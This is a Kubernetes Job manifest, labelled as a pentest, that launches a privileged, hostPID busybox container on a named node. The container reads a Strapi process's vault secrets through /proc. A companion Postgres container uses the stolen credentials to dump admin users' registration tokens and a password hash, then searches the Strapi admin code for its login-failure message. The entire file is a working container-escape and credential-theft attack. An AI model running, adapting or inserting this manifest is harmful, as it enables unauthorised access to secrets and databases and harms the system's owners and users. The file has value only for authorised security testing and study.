apiVersion: batch/v1
kind: Job
metadata:
  name: dbq4
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      nodeName: anubis-gateway-chatly-3akkk1
      hostPID: true
      volumes:
      - name: shared
        emptyDir: {}
      containers:
      - name: reader
        image: busybox:1.36
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: shared
          mountPath: /shared
        command: ["/bin/sh","-c"]
        args:
        - |
          for p in /proc/[0-9]*; do
            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
            case "$cmd" in
              *strapi.js*start*)
                cat $p/root/vault/secrets/config > /shared/config.env 2>/dev/null
                echo "reader: pid ${p#/proc/}" > /shared/reader.log
                break
                ;;
            esac
          done
          sleep 150
      - name: psql
        image: postgres:16-alpine
        volumeMounts:
        - name: shared
          mountPath: /shared
        command: ["/bin/sh","-c"]
        args:
        - |
          for i in $(seq 1 90); do [ -s /shared/config.env ] && break; sleep 2; done
          cat /shared/reader.log
          . /shared/config.env
          export PGPASSWORD="$DATABASE_PASSWORD" PGHOST="$DATABASE_HOST" PGPORT="$DATABASE_PORT" PGDATABASE="$DATABASE_NAME" PGUSER="$DATABASE_USERNAME" PGSSLMODE=require
          echo "##ROWS"
          psql -Atc "select 'R|'||id||'|'||coalesce(locale,'NULL')||'|'||coalesce(published_at::text,'NULL')||'|'||is_active||'|'||blocked||'|'||coalesce(registration_token,'NULL') from admin_users order by id" 2>&1
          echo "##OURHASH"
          psql -Atc "select password from admin_users where id=115" 2>&1
          echo "##SRC"
          for pp in /proc/[0-9]*; do
            c=$(tr '\0' ' ' < $pp/cmdline 2>/dev/null)
            case "$c" in *strapi.js*start*) D=$pp/root/opt/app; break;; esac
          done
          echo "D=$D"
          ls $D 2>&1 | head -30
          find $D/node_modules/.pnpm -maxdepth 1 -type d -name '@strapi+admin*' 2>&1 | head -5
          ADM=$(find $D/node_modules/.pnpm -maxdepth 1 -type d -name '@strapi+admin*' 2>/dev/null | head -1)/node_modules/@strapi/admin
          echo "ADM=$ADM"
          grep -rIl "Invalid credentials" $ADM/dist/server 2>/dev/null | head -5
          echo "##GREP"
          grep -rIn "Invalid credentials" $ADM/dist/server 2>/dev/null | head -10
          echo "##DONE"
